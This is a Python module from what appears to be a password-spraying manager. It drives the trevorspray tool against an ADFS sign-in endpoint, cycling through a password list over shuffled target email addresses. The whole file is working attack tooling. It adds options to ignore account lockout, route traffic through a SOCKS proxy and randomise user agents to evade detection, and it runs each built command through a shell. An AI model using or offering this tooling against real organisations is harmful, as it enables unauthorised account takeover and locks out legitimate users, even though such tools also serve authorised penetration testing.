#!/usr/bin/env python3
# modules/adfs.py
import sys
import os
import time
import subprocess
from datetime import datetime
import random


def adfsSpray(configs):
    print("[*] Starting the ADFS module...")

    targetUrl = configs['target']
    emailFile = configs['emails']
    delay = configs['delay']
    jitter = configs['jitter']
    lockout = configs['lockout']
    proxy = configs['proxy'].upper()

    # Read passwords from the specified file
    with open(configs['passwords'], 'r') as passfile:
        passwords = passfile.readlines()
    
    # Setup the log file and other variables
    sprayTimes = 0
    log_file = open("sprayManager.log", "w", encoding='utf-8')
    proxySet = False
    
    # Check if proxy is needed
    if proxy == 'Y':
        print("[*] Proxy is enabled, make sure TrevorProxy is running. Enter the proxy details in the form of socks5://127.0.0.1:1080")
        proxyServer = input("[*] Enter the proxy to use: ")
        proxyServer = f'--proxy {proxyServer}'
        proxySet = True
    else:
        pass

    # Start password spraying using the list of passwords
    for password in passwords:   
        sprayTimes += 1
        
        print(f"[*] Loading emails and shuffling them.")
        # Load emails and shuffle them
        with open(emailFile, 'r') as email_file:
            emails = email_file.readlines()
        random.shuffle(emails)
        
        # Write shuffled emails back to the file
        with open(emailFile, 'w') as email_file:
            email_file.writelines(emails) 
        
        print(f"[*] Starting ADFS spray #{sprayTimes} using password: {password.strip()} time is {datetime.now()}\n") 
        log_file.write(f"[*] Starting ADFS spray #{sprayTimes} using password: {password.strip()} time is {datetime.now()}\n")
        spray = f"trevorspray -u {emailFile} -p '{password.strip()}' -m adfs --url {targetUrl} -d {delay} -j {jitter}"
        
        # Check if ignore lockout is needed
        if lockout != 'Y':
            pass
        else:
            spray += f' --ignore-lockout'
        # Check if proxy is set           
        if proxySet == True:
            spray += f' {proxyServer}'
        else:
            pass
        # Generate randon user agent, and do not loot
        spray += f' --random-useragent -nl'
        
        # Execute the spray command using Trevorspray
        # print(spray.strip())
        try:
            subprocess.run(spray.strip(), shell=True, check=True)
        except subprocess.CalledProcessError as e:
            print(f"[!] Error during spray #{sprayTimes}: {e}")
            log_file.write(f"[!] Error during spray #{sprayTimes}: {e}\n")
            sys.exit(1)

        
        # Spray finished and log the results
        print(f"\n[*] Spray #{sprayTimes} finished at {datetime.now()}")
        log_file.write(f"[*] Spray #{sprayTimes} finished at {datetime.now()}\n")
    
    # Close log file   
    log_file.close()



if __name__ == "__main__":
    # This will only run if the file is executed directly
    print("Running Module directly is not allowed.")
